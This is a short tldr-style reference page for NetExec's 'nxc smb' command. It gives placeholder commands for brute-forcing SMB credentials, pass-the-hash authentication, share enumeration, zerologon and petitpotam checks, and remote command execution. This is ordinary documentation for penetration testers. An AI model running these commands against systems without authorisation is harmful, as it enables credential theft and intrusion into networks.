# nxc smb

> Pentest and exploit SMB servers.
> More information: <https://www.netexec.wiki/smb-protocol>.

- Search for valid domain credentials by trying out every combination in the specified lists of [u]sernames and [p]asswords:

`nxc smb {{192.168.178.2}} -u {{path/to/usernames.txt}} -p {{path/to/passwords.txt}}`

- Search for valid credentials for local accounts instead of domain accounts:

`nxc smb {{192.168.178.2}} -u {{path/to/usernames.txt}} -p {{path/to/passwords.txt}} --local-auth`

- Enumerate SMB shares and the specified users' access rights to them on the target hosts:

`nxc smb {{192.168.178.0/24}} -u {{username}} -p {{password}} --shares`

- Enumerate network interfaces on the target hosts, performing authentication via pass-the-hash:

`nxc smb {{192.168.178.30-45}} -u {{username}} -H {{NTLM_hash}} --interfaces`

- Scan the target hosts for common vulnerabilities:

`nxc smb {{path/to/target_list.txt}} -u '' -p '' -M zerologon -M petitpotam`

- Attempt to execute a command on the target hosts:

`nxc smb {{192.168.178.2}} -u {{username}} -p {{password}} -x {{command}}`
